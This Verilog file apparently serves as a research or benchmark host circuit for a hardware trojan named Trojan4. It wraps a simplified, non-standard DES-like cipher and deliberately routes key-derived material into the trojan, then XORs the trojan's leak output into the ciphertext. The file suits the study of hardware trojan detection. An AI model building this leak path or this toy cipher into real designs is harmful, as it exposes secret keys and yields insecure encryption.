// DES Host Circuit for Trojan4
// Fixed I/O to match Trojan4: clk, rst, key[63:0] -> leak[63:0]
module trojan4_des_host #(
    parameter ROUNDS = 8,         // Reduced DES rounds
    parameter [255:0] PERM_INIT = 256'h0F1E2D3C4B5A69780F1E2D3C4B5A69780F1E2D3C4B5A69780F1E2D3C4B5A6978
)(
    input wire clk,
    input wire rst,
    input wire [63:0] plaintext,
    input wire [63:0] des_key,
    input wire des_start,
    output reg [63:0] ciphertext,
    output reg des_done
);

    // Trojan interface (fixed width)
    wire [63:0] trojan_key;
    wire [63:0] trojan_leak;
    
    // DES state
    reg [31:0] left_half, right_half;
    reg [47:0] round_keys [0:ROUNDS-1];
    reg [$clog2(ROUNDS)-1:0] round_counter;
    reg des_active;
    
    // Key schedule for trojan
    reg [255:0] perm_state;
    reg [63:0] key_schedule;
    reg [7:0] subkey_counter;
    
    // Generate key material from DES key schedule
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            perm_state <= PERM_INIT;
            key_schedule <= 64'h0;
            subkey_counter <= 8'h0;
        end else if (des_start || des_active) begin
            perm_state <= {perm_state[254:0], perm_state[255] ^ perm_state[191] ^ perm_state[127] ^ perm_state[63]};
            key_schedule <= des_key ^ perm_state[63:0];
            subkey_counter <= subkey_counter + 1;
        end
    end
    
    assign trojan_key = key_schedule;
    
    // DES key schedule generation (simplified)
    integer i;
    reg [55:0] key_schedule_reg;
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            for (i = 0; i < ROUNDS; i = i + 1) begin
                round_keys[i] <= 48'h0;
            end
            key_schedule_reg <= 56'h0;
        end else if (des_start && !des_active) begin
            // PC-1 permutation (simplified)
            key_schedule_reg <= des_key[55:0];
            
            for (i = 0; i < ROUNDS; i = i + 1) begin
                // Generate round keys (simplified)
                round_keys[i] <= key_schedule_reg[47:0] ^ (48'h123456789ABC << i);
            end
        end
    end
    
    // DES Feistel function (simplified)
    function [31:0] des_f;
        input [31:0] half_block;
        input [47:0] subkey;
        reg [47:0] expanded;
        reg [31:0] substituted;
        begin
            // Expansion (simplified) - 48 bits from 32 bits
            expanded = {half_block[31:16], half_block[15:0], half_block[31:16]};
            
            // XOR with subkey
            expanded = expanded ^ subkey;
            
            // S-box substitution (simplified)
            substituted = expanded[31:0] ^ {expanded[47:32], expanded[15:0]};
            
            // Permutation (simplified)
            des_f = {substituted[15:0], substituted[31:16]};
        end
    endfunction
    
    // DES main encryption state machine
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            left_half <= 32'h0;
            right_half <= 32'h0;
            round_counter <= {$clog2(ROUNDS){1'b0}};
            des_active <= 1'b0;
            des_done <= 1'b0;
        end else begin
            if (des_start && !des_active) begin
                // Initial permutation (simplified)
                left_half <= plaintext[63:32];
                right_half <= plaintext[31:0];
                round_counter <= {$clog2(ROUNDS){1'b0}};
                des_active <= 1'b1;
                des_done <= 1'b0;
            end else if (des_active) begin
                if ({28'b0, round_counter} < ROUNDS) begin
                    // DES round
                    left_half <= right_half;
                    right_half <= left_half ^ des_f(right_half, round_keys[round_counter]);
                    round_counter <= round_counter + 1;
                end else begin
                    des_active <= 1'b0;
                    des_done <= 1'b1;
                end
            end else begin
                des_done <= 1'b0;
            end
        end
    end
    
    // Output with trojan leak integration
    always @(posedge clk or posedge rst) begin
        if (rst)
            ciphertext <= 64'h0;
        else if (des_done) begin
            // Final permutation and mix with trojan leak
            ciphertext <= {right_half, left_half} ^ trojan_leak;
        end
    end
    
    // Instantiate Trojan4
    Trojan4 trojan_inst (
        .clk(clk),
        .rst(rst),
        .key(trojan_key),
        .leak(trojan_leak)
    );

endmodule
